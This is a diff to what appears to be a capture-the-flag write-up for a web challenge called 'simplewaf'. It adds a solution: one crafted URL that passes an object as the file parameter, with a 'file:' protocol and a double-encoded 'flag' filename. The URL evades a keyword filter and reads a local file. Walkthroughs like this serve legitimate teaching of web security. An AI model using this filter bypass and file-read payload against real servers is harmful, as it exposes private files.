@@ -52,3 +52,9 @@ As the code says, if we request the flag, we get the response mensioned above.
 ![picture 4](../images/6ab923498a914dcb00c3992ad0707c03150b55d9f9d6a3febd0f8b7fa2e0b872.png)  
 
 So... what If I encode the "flag" in the request?
+
+- Solution
+
+```
+https://web-simplewaf-648d0d347a3ce6fa.be.ax/?file[href]=x&file[origin]=x&file[protocol]=file:&file[hostname]=&file[pathname]=fl%2561g.txt
+```
